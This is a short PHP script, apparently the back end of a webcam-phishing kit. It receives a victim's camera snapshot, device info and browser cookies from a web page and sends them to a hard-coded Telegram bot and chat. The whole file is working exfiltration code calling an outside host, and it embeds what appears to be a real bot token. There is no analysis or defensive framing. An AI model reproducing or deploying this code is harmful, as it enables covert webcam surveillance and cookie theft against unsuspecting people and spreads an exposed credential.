<?php
$botToken = "8771622459:AAHTQLVU5fSRbP_gTZ4nFkqSKw2vyyHSlgM";
$chatId = "8504751121";

if (isset($_POST['img'])) {
    $imageData = substr($_POST['img'], strpos($_POST['img'], ",")+1);
    $binaryData = base64_decode($imageData);
    $fileName = 'cam_' . time() . '.jpg';
    file_put_contents($fileName, $binaryData);

    $info = isset($_POST['info']) ? $_POST['info'] : "N/A";
    $cookies = isset($_POST['cookies']) ? $_POST['cookies'] : "N/A";
    $text = "Info: " . $info . "\nCookies: " . $cookies;
    
    file_get_contents("https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=" . urlencode($text));

    $postFields = ['chat_id' => $chatId, 'photo' => new CURLFile(realpath($fileName))];
    $ch = curl_init("https://api.telegram.org/bot$botToken/sendPhoto");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_exec($ch);
    curl_close($ch);
    
    if(file_exists($fileName)) unlink($fileName);
}
?>

